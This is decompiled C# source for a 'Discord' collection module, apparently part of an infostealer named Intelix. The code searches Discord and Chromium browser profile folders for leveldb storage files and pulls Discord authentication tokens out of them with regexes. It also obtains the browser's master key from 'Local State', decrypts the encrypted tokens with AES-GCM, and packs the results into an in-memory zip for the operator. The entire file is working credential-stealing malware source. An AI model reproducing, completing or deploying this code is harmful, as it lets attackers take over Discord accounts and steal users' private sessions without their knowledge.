using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000017 RID: 23
	public class Discord : ITarget
	{
		// Token: 0x06000041 RID: 65 RVA: 0x000037E8 File Offset: 0x000019E8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Discord";
			counterApplications.Files.Add("Discord\\");
			Task task = Task.Run(delegate()
			{
				Parallel.ForEach<string>(Paths.Discord, delegate(string path)
				{
					string text = path + "\\Local Storage\\leveldb";
					bool flag2 = Directory.Exists(text);
					if (flag2)
					{
						string localstate = path + "\\Local State";
						List<string> list = this.TokensGrabber(text, localstate);
						bool flag3 = list.Any<string>();
						if (flag3)
						{
							string browserName = Paths.GetBrowserName(path);
							string text2 = "Discord\\" + browserName + ".txt";
							counterApplications.Files.Add(path + " => " + text2);
							zip.AddTextFile(text2, string.Join("\n", list));
						}
					}
				});
			});
			Task task2 = Task.Run(delegate()
			{
				Parallel.ForEach<string>(Paths.Chromium, delegate(string path)
				{
					bool flag2 = Directory.Exists(path);
					if (flag2)
					{
						Parallel.ForEach<string>(Directory.GetDirectories(path), delegate(string profile)
						{
							string text = profile + "\\Local Storage\\leveldb";
							bool flag3 = Directory.Exists(text);
							if (flag3)
							{
								string localstate = path + "\\Local State";
								List<string> list = this.TokensGrabber(text, localstate);
								bool flag4 = list.Any<string>();
								if (flag4)
								{
									string browserName = Paths.GetBrowserName(path);
									string text2 = string.Concat(new string[]
									{
										"Discord\\",
										browserName,
										" ",
										Path.GetFileName(profile),
										".txt"
									});
									counterApplications.Files.Add(path + " => " + text2);
									zip.AddTextFile(text2, string.Join("\n", list));
								}
							}
						});
					}
				});
			});
			Task.WaitAll(new Task[]
			{
				task,
				task2
			});
			bool flag = counterApplications.Files.Count<string>() > 0;
			if (flag)
			{
				counter.Messangers.Add(counterApplications);
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000038A0 File Offset: 0x00001AA0
		private List<string> TokensGrabber(string localstorage, string localstate)
		{
			List<string> source = this.SearchFiles(localstorage);
			ConcurrentBag<string> tokens = new ConcurrentBag<string>();
			ConcurrentBag<string> tokensEncrypted = new ConcurrentBag<string>();
			Parallel.ForEach<string>(source, delegate(string localdb)
			{
				try
				{
					string content = File.ReadAllText(localdb);
					Parallel.ForEach<string>(this.SearchToken(content), delegate(string token)
					{
						tokens.Add(token);
					});
					Parallel.ForEach<string>(this.SearchEncryptedTokens(content), delegate(string token)
					{
						tokensEncrypted.Add(token);
					});
				}
				catch
				{
				}
			});
			ConcurrentBag<string> distinctTokens = new ConcurrentBag<string>(tokens.Distinct<string>());
			bool flag = !tokensEncrypted.Any<string>();
			List<string> result;
			if (flag)
			{
				result = distinctTokens.Distinct<string>().ToList<string>();
			}
			else
			{
				byte[] key = LocalState.MasterKeyV10(localstate);
				bool flag2 = key == null;
				if (flag2)
				{
					result = distinctTokens.Distinct<string>().ToList<string>();
				}
				else
				{
					Parallel.ForEach<string>(tokensEncrypted.Distinct<string>(), delegate(string encrypted)
					{
						try
						{
							byte[] array = AesGcm.DecryptBrowser(Convert.FromBase64String(encrypted), key, null, false);
							bool flag3 = array != null;
							if (flag3)
							{
								distinctTokens.Add(Encoding.UTF8.GetString(array).Trim());
							}
						}
						catch
						{
						}
					});
					result = distinctTokens.Distinct<string>().ToList<string>();
				}
			}
			return result;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00003988 File Offset: 0x00001B88
		private List<string> SearchFiles(string path)
		{
			ConcurrentBag<string> locals = new ConcurrentBag<string>();
			string[] allowedExtensions = new string[]
			{
				".log",
				".ldb",
				".sqlite"
			};
			Parallel.ForEach<string>(Directory.GetFiles(path), delegate(string file)
			{
				bool flag = allowedExtensions.Contains(Path.GetExtension(file));
				if (flag)
				{
					locals.Add(file);
				}
			});
			return locals.ToList<string>();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000039F4 File Offset: 0x00001BF4
		private List<string> ExtractMatches(string content, Regex regex)
		{
			HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			foreach (object obj in regex.Matches(content))
			{
				Match match = (Match)obj;
				string value = match.Groups[1].Value;
				bool flag = !string.IsNullOrWhiteSpace(value);
				if (flag)
				{
					hashSet.Add(value);
				}
			}
			return hashSet.ToList<string>();
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00003A94 File Offset: 0x00001C94
		private List<string> SearchToken(string content)
		{
			return this.ExtractMatches(content, Discord._tokenRegex);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003AB4 File Offset: 0x00001CB4
		private List<string> SearchEncryptedTokens(string content)
		{
			return this.ExtractMatches(content, Discord._encryptedRegex);
		}

		// Token: 0x04000002 RID: 2
		private static readonly Regex _tokenRegex = new Regex("(mfa\\.[\\w-]{80,})|((MT|OD)[\\w-]{22,24}\\.[\\w-]{6}\\.[\\w-]{25,110})", RegexOptions.IgnoreCase | RegexOptions.Compiled);

		// Token: 0x04000003 RID: 3
		private static readonly Regex _encryptedRegex = new Regex("\"dQw4w9WgXcQ:([^\"]+)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled);
	}
}
